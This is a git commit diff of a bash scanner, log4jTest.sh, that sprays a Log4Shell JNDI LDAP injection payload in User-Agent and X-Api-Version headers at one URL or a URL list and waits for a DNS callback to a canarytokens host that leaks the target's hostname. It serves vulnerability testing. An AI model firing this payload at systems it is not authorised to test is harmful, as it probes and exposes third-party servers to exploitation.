7f892db31474aa4f517efcd1bae09f5e87fe487a
Abhijeet Singh <abhi009215@gmail.com>
2021-12-22 01:14:35 +0530

    Ready with the options

--- log4jTest.sh
+++ log4jTest.sh
@@ -2,6 +2,20 @@
 #Author: Abhijeet Singh (@abhiunix)
 #Date: 12 Dec 2021
 #Twitter: https://twitter.com/abhiunix
+# Sample Payload: ${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}
+
+payload='${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}'
+echo ""
+echo -e "Your Payload: \033[31m$payload\033[m"
+
+payload1='User-Agent: '
+payload1+=$payload
+
+payload2='X-Api-Version: '
+payload2+=$payload
+
+# payloadNormal(){
+# }
 
 function toolsCheck(){
     if [ -x "$(which httpx)" ] ; then
@@ -15,14 +29,15 @@ function toolsCheck(){
 
 function functionu(){
 echo ""
-echo "Checking for log4j vulnerability on $uo"
+echo -e "Checking for log4j vulnerability on \033[31m$uo\033[m"
 
-null=$(curl -sk $uo -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0')
-null=$(curl -sk $uo -H 'User-Agent: ${jndi:ldap://x${hostName}.L4J.05k3mkguoclo1yogn6z1qzjvx.canarytokens.com/a}')
+null=$(curl -sk $uo -H "$payload1"  --proxy 127.0.0.1:8080 --connect-timeout 2 -m 5)
+
+null=$(curl -sk $uo -H "$payload2" -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0' --proxy 127.0.0.1:8080 --connect-timeout 2 -m 5)
 
 }
 
-function functionU(){
+function functionl(){
 echo ""
 while IFS= read -r line; do
 	uo=$line
@@ -34,44 +49,69 @@ if (( $# < 1 )); then
      echo "Try using valid options. Use -h to show help menu."
      exit  
 fi
+
 toolsCheck
-while getopts u:U:hc options; do
+
+while getopts u:p:l:hc options; do
+
 		case $options in
 				u) uo=$OPTARG;;
-				U) Uo=$OPTARG;;
+				l) lo=$OPTARG;;
 				h) ho=$OPTARG;;
 				p) po=$OPTARG;;
-				l) lo=$OPTARG;;
 				*) echo "Try using valid options. use -h to show help menu.";;
 
 		esac
+
+
 		if [[ $options = "u" ]]; then
 			functionu
-			echo "Payload executed. You will be notified on your email for successful execution."
+			echo -e "\033[31mIf the payload fire-up, you will get the DNS request on your server.\033[m"
+			
 
-		elif [[ $options = "U" ]]; then
+		elif [[ $options = "l" ]]; then
 			echo "Checking if the supplied list of URLs are working fine."
-			sleep 3
-			cat $2 | httpx | tee $2.urls
 			echo ""
 			sleep 1
-			echo "Nice!! We have collected the working urls in $2.urls file."
+
+			urlContent=$(cat $2| grep -E '^(http|https)://')
+
+			if [ -z "$urlContent" ]; then
+				#The file is empty. URL is like this google.com. 
+				echo -e "\033[31mURLs need to be in correct format. Making it usable with httpx.\033[m"
+				cat $2 | httpx --silent | tee $2.urls
+				echo ""
+				echo "Done Successfully"
+			else
+				echo "You have provided urls in correct format. So, no change."
+				cp $2 $2.urls
+			fi
+
+			echo ""
+			sleep 1
+
+			numOfURLs=$(cat $2.urls|awk 'END { print NR }')
+
+			echo -e "Nice!! We have collected \033[31m$numOfURLs working urls\033[m  in \033[31m$2.urls\033[m file."
 			echo ""
 			sleep 2
-			echo "Now executing log4j payloads on supplied URLs."
+			echo -e "Now executing \033[31mlog4j payloads\033[m on supplied URLs."
+			echo "=================================================================="
 			sleep 3
-			functionU < $2.urls
+			functionl < $2.urls
 			
-			echo "Finished the URLs"
+			echo "Finished!!"
+			echo ""
+			echo -e "\033[31mIf the payload fire-up, you will get the DNS request on your server.\033[m"
 
 		elif [[ $options = "h" ]]; then
-			echo "Usage::"
+			echo -e "\033[31mUsage:\033[m"
 			echo "  -h   Show basic help message and exit"
 			echo "  -u   Target URL (e.g. 'http://www.site.com/')"
-			echo "  -U   Target URL list file."
+			echo "  -l   Target URL list file."
 			echo ""
 			echo "eg: ./log4jTest.sh -u https://example.com"
-			echo "eg: ./log4jTest.sh -U ./path/URLlist.txt"
+			echo "eg: ./log4jTest.sh -l ./path/URLlist.txt"
 		fi
 done
 #enhancement
